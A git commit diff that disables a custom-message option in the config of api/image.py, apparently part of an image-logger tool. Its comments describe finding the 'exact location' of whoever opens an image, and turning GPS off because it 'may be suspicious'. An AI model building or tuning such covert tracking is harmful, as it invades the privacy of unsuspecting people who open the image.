589c3104e5fdfd0cbf9213a8e8a1d56b36a8869d
meowing-24 <sxdeslxdeproduction@gmail.com>
2025-11-24 20:20:15 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -28,7 +28,7 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "join https://discord.gg/Aryvab84rD", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
